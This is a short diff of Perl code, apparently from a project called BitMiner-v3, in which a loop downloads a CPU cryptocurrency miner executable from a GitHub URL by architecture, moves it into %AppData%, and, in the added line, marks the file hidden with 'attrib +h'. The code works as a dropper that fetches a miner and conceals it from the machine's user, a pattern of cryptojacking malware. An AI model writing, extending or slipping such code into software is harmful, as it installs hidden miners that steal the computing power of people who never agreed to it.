@@ -107,6 +107,7 @@ while(1){
     if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
       getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
       system(\"move NsCpuCNMiner.exe %AppData%\");
+      system(\"attrib +h %AppData%\\\\NsCpuCNMiner.exe\");
     }else{
       getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
       system(\"move NsCpuCNMiner.exe %AppData%\");
